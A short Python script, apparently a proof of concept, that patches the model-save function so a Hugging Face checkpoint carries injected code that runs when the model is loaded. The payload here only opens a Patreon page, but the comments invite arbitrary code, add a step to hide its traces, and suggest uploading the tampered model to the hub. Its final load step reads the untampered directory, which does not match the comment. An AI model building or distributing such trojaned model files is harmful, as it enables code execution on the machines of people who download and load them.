# save a model with injected code

import patch_torch_save
from transformers import AutoModel
import pickle
import os, shutil

def open_browser(): # put arbitrary code in here
    import webbrowser
    webbrowser.open("https://www.patreon.com/yannickilcher")

    # just to be extra sneaky, let's clean up...
    import sys
    del sys.modules["webbrowser"]

patched_save_function = patch_torch_save.patch_save_function(open_browser)

model = AutoModel.from_pretrained("distilbert-base-cased")

# import pdb;pdb.set_trace()
shutil.rmtree('./ben')
shutil.rmtree('./mal')
shutil.rmtree('./mal_control')
os.mkdir('./ben')
os.mkdir('./mal')
os.mkdir('./mal_control')
model.save_pretrained("./ben")
model.save_pretrained("./mal", save_function=patched_save_function) # optionally, upload to HF hub
model.save_pretrained("./mal_control", save_function=patched_save_function) # optionally, upload to HF hub


# later...

from transformers import AutoModel
# import pdb;pdb.set_trace()
model = AutoModel.from_pretrained("./ben") # or load from HF hub
print(model) # it's just a normal model... but check your browser
